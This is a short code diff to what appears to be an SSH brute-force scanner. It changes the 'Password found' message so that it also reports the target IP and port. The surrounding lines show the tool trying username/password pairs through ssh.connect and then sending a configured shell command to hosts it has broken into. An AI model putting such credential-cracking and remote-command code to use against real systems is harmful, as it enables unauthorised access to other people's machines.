@@ -169,7 +169,7 @@ class SSHScan():
                     if self.verbose:
                         print("Cracking SSH account ({}/{})...".format(user,psw))
                     ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
-                    print(green_text+"[*] Password found ({}/{})...".format(user,psw)+reset_text)
+                    print(green_text+"[*] Password found ({}/{}) on {}:{}".format(user,psw, ip, self.ssh_port)+reset_text)
 
                     if self.ssh_linux_shellcode is not None:
                         print("Sending command: {}".format(self.ssh_linux_shellcode)) 
